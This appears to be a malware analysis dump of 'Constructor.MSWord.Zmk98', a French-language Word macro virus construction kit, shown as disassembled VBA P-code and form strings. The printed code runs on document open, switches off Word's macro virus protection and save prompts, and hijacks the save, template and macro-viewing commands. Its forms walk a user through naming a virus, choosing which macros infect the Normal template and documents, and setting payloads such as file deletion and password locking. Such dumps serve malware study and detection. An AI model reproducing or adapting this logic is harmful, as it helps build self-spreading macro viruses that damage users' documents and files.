' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier4"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier4"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld CheckBox5 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier5"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier5"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld CheckBox6 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier6"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #29:
' 	ElseBlock 
' Line #30:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier6"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld CheckBox7 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier7"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #34:
' 	ElseBlock 
' Line #35:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier7"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld CheckBox8 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier8"
' 	LitStr 0x0003 "Oui"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier8"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	Ld PayDelete 
' 	ArgsCall Unlock 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #45:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #46:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #47:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #48:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #49:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier1"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #50:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier2"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #51:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier3"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #52:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier4"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #53:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier5"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #54:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier6"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #55:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier7"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #56:
' 	LitStr 0x0009 "PayDelete"
' 	LitStr 0x0008 "Fichier8"
' 	LitStr 0x0003 "Non"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #57:
' 	EndSub 
' Macros/VBA/PayMDP - 2843 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x001F "Veuillez entrer un mot de passe"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0006 "PayMDP"
' 	LitStr 0x0006 "Valeur"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0023 "Veuillez retaper votre mot de passe"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0006 "PayMDP"
' 	LitStr 0x0007 "Valeur1"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld TextBox1 
' 	MemLd Value 
' 	Ld TextBox2 
' 	MemLd Value 
' 	Eq 
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld PayMDP 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	ElseBlock 
' Line #15:
' 	LitStr 0x0023 "Veuillez retaper votre mot de passe"
' 	Ld vbCritical 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #19:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #20:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	EndSub 
' Macros/VBA/PayMess - 2763 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x002E "Veuillez entrer le titre de la boîte à message"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #4:
' 	ElseBlock 
' Line #5:
' 	LitStr 0x0007 "PayMess"
' 	LitStr 0x0008 "MessageT"
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0025 "Veuillez entrer le message à afficher"
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	ElseBlock 
' Line #10:
' 	LitStr 0x0007 "PayMess"
' 	LitStr 0x0008 "MessageM"
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld TextBox1 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld TextBox2 
' 	MemLd Value 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #13:
' 	Ld PayMess 
' 	ArgsCall Unlock 0x0001 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndSub 
' Line #16:
' Line #17:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #18:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #19:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' 	EndSub 
' Line #23:
' Macros/VBA/PayType - 4639 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld CheckBox1 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #3:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x0001 "1"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #4:
' 	Ld PayType 
' 	ArgsCall Unlock 0x0001 
' Line #5:
' 	Ld PayMess 
' 	ArgsMemCall Show 0x0000 
' Line #6:
' 	EndIfBlock 
' Line #7:
' 	Ld CheckBox2 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x0001 "2"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #9:
' 	Ld PayType 
' 	ArgsCall Unlock 0x0001 
' Line #10:
' 	Ld PayDelete 
' 	ArgsMemCall Show 0x0000 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld CheckBox3 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #13:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x0001 "3"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #14:
' 	Ld PayType 
' 	ArgsCall Unlock 0x0001 
' Line #15:
' 	Ld PayMDP 
' 	ArgsMemCall Show 0x0000 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld CheckBox4 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x0001 "4"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #19:
' 	Ld PayType 
' 	ArgsCall Unlock 0x0001 
' Line #20:
' 	Ld PayAssist 
' 	ArgsMemCall Show 0x0000 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld CheckBox5 
' 	MemLd Value 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #23:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x0001 "0"
' 	LitStr 0x000D "ZMK98MVCK.INI"
' 	Ld Wordbasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #24:
' 	Ld PayType 
' 	ArgsCall Unlock 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	EndSub 
' Line #27:
' Line #28:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #29:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #30:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' 	EndSub 
' Macros/VBA/Recapitulatif - 4689 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #3:
' 	Ld Recapitulatif 
' 	ArgsCall Unlock 0x0001 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #7:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	Dim 
' 	VarDefn VirName
' 	VarDefn VirFile
' 	VarDefn Stealth
' 	VarDefn MacroMod
' 	VarDefn MacroDOC
' 	VarDefn PayType
' Line #12:
' 	LitStr 0x0008 "FileName"
' 	LitStr 0x0003 "Nom"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St VirName$ 
' Line #13:
' 	LitStr 0x0008 "FileName"
' 	LitStr 0x0007 "Fichier"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St VirFile$ 
' Line #14:
' 	LitStr 0x0009 "Technique"
' 	LitStr 0x0006 "Furtif"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St Stealth$ 
' Line #15:
' 	LitStr 0x0009 "MacroType"
' 	LitStr 0x0006 "NameMN"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St MacroMod$ 
' Line #16:
' 	LitStr 0x0009 "MacroType"
' 	LitStr 0x0007 "NameDOC"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St MacroDOC$ 
' Line #17:
' 	LitStr 0x0007 "PayType"
' 	LitStr 0x0004 "Type"
' 	LitStr 0x0009 "ZMK98MVCK"
' 	Ld Wordbasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St PayType$ 
' Line #18:
' 	Ld VirName$ 
' 	Ld Label3 
' 	MemSt Caption 
' Line #19:
' 	Ld VirFile$ 
' 	Ld Label5 
' 	MemSt Caption 
' Line #20:
' 	LitStr 0x0003 "Oui"
' 	Ld Label7 
' 	MemSt Caption 
' Line #21:
' 	Ld MacroMod$ 
' 	Ld Label11 
' 	MemSt Caption 
' Line #22:
' 	Ld MacroDOC$ 
' 	Ld Label12 
' 	MemSt Caption 
' Line #23:
' 	Ld PayType$ 
' 	Ld Label14 
' 	MemSt Caption 
' Line #24:
' 	Ld CurDir 
' 	Ld Label16 
' 	MemSt Caption 
' Line #25:
' 	EndSub 
' Macros/VBA/Welcome - 2644 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #2:
' 	Ld Welcome 
' 	ArgsCall Unlock 0x0001 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub UserForm_Initialize())
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #9:
' 	EndSub 
' Macros/VBA/ZMK98MVCK - 8790 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAO 
' Line #6:
' 	Ld Welcome 
' 	ArgsMemCall Show 0x0000 
' Line #7:
' 	Ld FileName 
' 	ArgsMemCall Show 0x0000 
' Line #8:
' 	Ld MacroType 
' 	ArgsMemCall Show 0x0000 
' Line #9:
' 	Ld Message 
' 	ArgsMemCall Show 0x0000 
' Line #10:
' 	Ld MacroPay 
' 	ArgsMemCall Show 0x0000 
' Line #11:
' 	Ld PayType 
' 	ArgsMemCall Show 0x0000 
' Line #12:
' 	Ld Recapitulatif 
' 	ArgsMemCall Show 0x0000 
' Line #13:
' 	Ld Compilation 
' 	ArgsMemCall Show 0x0000 
' Line #14:
' 	Label ErrorAO 
' Line #15:
' 	EndSub 
' Line #16:
' 	FuncDefn (Sub FileSaveAs())
' Line #17:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #18:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	OnError ErrorFSA 
' Line #22:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #23:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #24:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	Label ErrorFSA 
' Line #27:
' 	EndSub 
' Line #28:
' 	FuncDefn (Sub FileTemplates())
' Line #29:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #30:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #32:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #33:
' 	OnError ErrorFT 
' Line #34:
' 	LitStr 0x0014 "Fonction sub inconnu"
' 	Ld vbCritical 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #35:
' 	Label ErrorFT 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Sub ToolsMacro())
' Line #38:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #39:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #42:
' 	OnError ErrorTM 
' Line #43:
' 	LitStr 0x0030 "Je suis un kit de construction et non un VIRUS.."
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #44:
' 	Label ErrorTM 
' Line #45:
' 	EndSub 
' Line #46:
' 	FuncDefn (Sub ViewVBCode())
' Line #47:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #48:
' 	LitDI2 0x0000 
' 	Ld Wordbasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #49:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #51:
' 	OnError ErrorVVBC 
' Line #52:
' 	LitStr 0x0027 "Je vais vous aider à créer des virus..."
' 	Ld vbInformation 
' 	LitStr 0x0009 "ZMK98MVCK"
' 	ArgsCall MsgBox 0x0003 
' Line #53:
' 	Label ErrorVVBC 
' Line #54:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Voulez-vous lancer la compilation de votre virus ?k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/Compilation/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez entrer le nom de votre virus:ot
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Veuillez indiquer le nom du fichier sans extension dans lequell
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sera sauvegard� votre virus:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/FileName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Quel macro voulez-vous utilisez pour appeler la charge ?k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoOpen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroPay/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Avec quel macro voulez-vous infecter le mod�le normal ?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AutoOpen
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Avec quel macro voulez-vous infecter les documents ?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FileSaveAsO
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.Zmk98' - OLE stream: 'Macros/MacroType/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
